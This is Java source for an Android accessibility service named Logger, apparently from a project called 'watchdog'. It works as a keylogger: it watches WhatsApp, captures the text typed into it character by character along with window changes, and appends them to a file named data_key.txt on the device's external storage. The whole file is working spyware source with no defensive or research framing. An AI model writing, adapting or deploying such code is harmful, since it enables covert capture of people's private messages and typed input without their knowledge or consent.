package com.sudy.watchdog;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.os.Environment;
import android.view.accessibility.AccessibilityEvent;
import android.widget.Toast;

import java.io.File;
import java.io.FileOutputStream;

/**
 * Created by sudy49730 on 07/04/2018.
 */

public class Logger extends AccessibilityService {
    String filename = "data_key.txt";
    String filepath = Environment.getExternalStorageDirectory() + "/watchdog/" + filename;
    File fp=new File(filepath);
    public void logText(String data){
        if(fp.exists()){
            try {
                FileOutputStream fos = new FileOutputStream(filepath,true);
                fos.write(data.getBytes());
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        else{
            try{
                fp.createNewFile();
            }catch(Exception e){e.printStackTrace();}
        }
    }
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        String text;
        int type_of_event=event.getEventType();
        switch(type_of_event){
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                CharSequence s = ""+event.getText();
                text=s+"";
                String lastchar=""+text.charAt(text.length() - 2);
                logText(lastchar);
                break;
            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                logText("\nChanged Window\n");
                break;
            case AccessibilityEvent.TYPE_VIEW_CLICKED:
                //Do nothing
                break;
        }
    }

    @Override
    public void onInterrupt() {

    }
    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo info=new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_CLICKED |
                AccessibilityEvent.TYPE_VIEW_FOCUSED |
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED|
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED;
        info.packageNames = new String[]
                {"com.whatsapp"};
        info.notificationTimeout = 50;
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        this.setServiceInfo(info);
        //Create a new file
        try{
            fp.createNewFile();
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
